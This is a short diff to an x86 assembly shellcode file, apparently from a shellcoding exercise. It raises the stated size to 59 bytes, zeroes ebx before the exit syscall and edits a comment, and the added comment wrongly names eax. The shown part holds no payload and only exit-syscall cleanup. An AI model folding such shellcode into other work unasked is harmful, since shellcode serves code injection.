@@ -1,4 +1,4 @@
-;Shellcode size : 57 bytes
+;Shellcode size : 59 bytes
 global _start
 
 _start:
@@ -30,7 +30,8 @@ _start:
 
 
     xor eax, eax        ;Initialize eax to NULL
+    xor ebx, ebx        ;Initialize eax to NULL
     inc eax             ;move the systemcall number inside eax
     ;Systemcall details:
     ; --> exit(0)
-    int 0x80            ;exit(0)
+    int 0x80            ;execute systemcall
